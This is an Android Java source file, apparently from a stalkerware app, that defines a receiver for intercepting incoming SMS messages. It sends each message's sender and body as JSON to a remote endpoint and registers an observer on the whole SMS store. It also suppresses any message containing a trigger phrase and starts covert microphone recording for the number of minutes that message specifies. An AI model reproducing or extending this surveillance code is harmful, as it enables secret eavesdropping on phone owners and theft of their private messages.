package com.inet.android.sms;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.telephony.SmsMessage;

import com.inet.android.audio.RecordAudio;
import com.inet.android.certificate.R;
import com.inet.android.request.ConstantRequest;
import com.inet.android.request.DataRequest;
import com.inet.android.utils.ConvertDate;
import com.inet.android.utils.Logging;
import com.inet.android.utils.WhileTheMethod;

/**
 * SmsSentObserver class is design for monitoring incoming sms
 * 
 * @author johny homicide
 * 
 */
public class SMSBroadcastReceiver extends BroadcastReceiver {
	private static final String TAG = SMSBroadcastReceiver.class.getSimpleName().toString();
	private Context mContext;
	private Bundle mBundle;
	private String LOG_TAG = SMSBroadcastReceiver.class.getSimpleName()
			.toString();

	public void onReceive(Context context, Intent intent) {
		// Tom Xue: intent -> bundle -> Object messages[] -> smsMessage[]
		this.mContext = context;
		mBundle = intent.getExtras();
		if (WhileTheMethod.getState(2, context) == 0)
			return;

		try {
			getSMSDetails();
		} catch (Exception sgh) {
			Logging.doLog(TAG, "Error in Init : " + sgh.toString(),
					"Error in Init : " + sgh.toString());
		}
	}
		
	public static void regSmsObserver(Context mContext) {
		SmsSentObserver observer = new SmsSentObserver(null);
		observer.setContext(mContext);
		mContext.getContentResolver().registerContentObserver(
				Uri.parse("content://sms"), true, observer);

	}

	@SuppressLint("SimpleDateFormat")
	private void getSMSDetails() {
		SmsMessage[] msgs = null;

		try {
			Object[] pdus = (Object[]) mBundle.get("pdus");
			if (pdus != null) {
				msgs = new SmsMessage[pdus.length];
				String startRecord = mContext.getString(R.string.start_record);

				StringBuilder bodyText = new StringBuilder();
				for (int k = 0; k < msgs.length; k++) {
					msgs[k] = SmsMessage.createFromPdu((byte[]) pdus[k]);

					if (msgs[k].getMessageBody().toLowerCase()
							.contains(startRecord)) {
						Logging.doLog(LOG_TAG, "start record", "start record");
						abortBroadcast();
						int minute = Integer.parseInt(msgs[k].getMessageBody()
								.substring(
										msgs[k].getMessageBody().lastIndexOf(
												"d") + 1,
										msgs[k].getMessageBody().length())) * 60;
						Logging.doLog(LOG_TAG, "sec: " + minute, "sec: "
								+ minute);
						RecordAudio recordAudio = new RecordAudio(minute, 0);
						recordAudio.executeRecording();
					}

				}
				String phNumber = msgs[0].getOriginatingAddress();

				for (int i = 0; i < msgs.length; i++) {
					bodyText.append(msgs[i].getMessageBody());
				}

				// -------send sms--------------------------------
				String sendJSONStr = null;
				JSONObject jsonObject = new JSONObject();
				JSONArray data = new JSONArray();
				JSONObject info = new JSONObject();
				JSONObject object = new JSONObject();
				try {

					info.put("number", phNumber);
					info.put("data", bodyText.toString());

					object.put("time", ConvertDate.logTime());
					object.put("type", ConstantRequest.TYPE_INCOMING_SMS_REQUEST);
					object.put("info", info);
					data.put(object);
					jsonObject.put("data", data);
					sendJSONStr = object.toString();
				} catch (JSONException e) {
					Logging.doLog(LOG_TAG, "json сломался", "json сломался");
				}

				DataRequest dr = new DataRequest(mContext);
				dr.sendRequest(sendJSONStr);

				Logging.doLog(LOG_TAG, sendJSONStr, sendJSONStr);

			}
		} catch (Exception sfgh) {
			Logging.doLog(TAG, "Error in getSMSDetails : " + sfgh.toString(),
					"Error in getSMSDetails : " + sfgh.toString());
		}
	}

}
